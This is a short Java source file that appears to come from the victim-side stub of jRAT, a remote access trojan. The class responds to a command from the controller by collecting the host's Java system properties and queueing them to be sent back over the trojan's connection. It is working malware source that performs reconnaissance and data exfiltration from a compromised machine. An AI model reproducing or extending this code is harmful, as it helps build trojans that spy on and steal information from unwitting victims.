package se.jrat.stub.packets.incoming;

import java.util.Set;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet44SystemJavaProperty;


public class Packet61SystemJavaProperties extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Set<Object> keys = System.getProperties().keySet();
		for (Object obj : keys) {
			if (obj.toString().toLowerCase().startsWith("java")) {
				Connection.instance.addToSendQueue(new Packet44SystemJavaProperty(obj.toString(), System.getProperty(obj.toString())));
			}
		}
	}

}
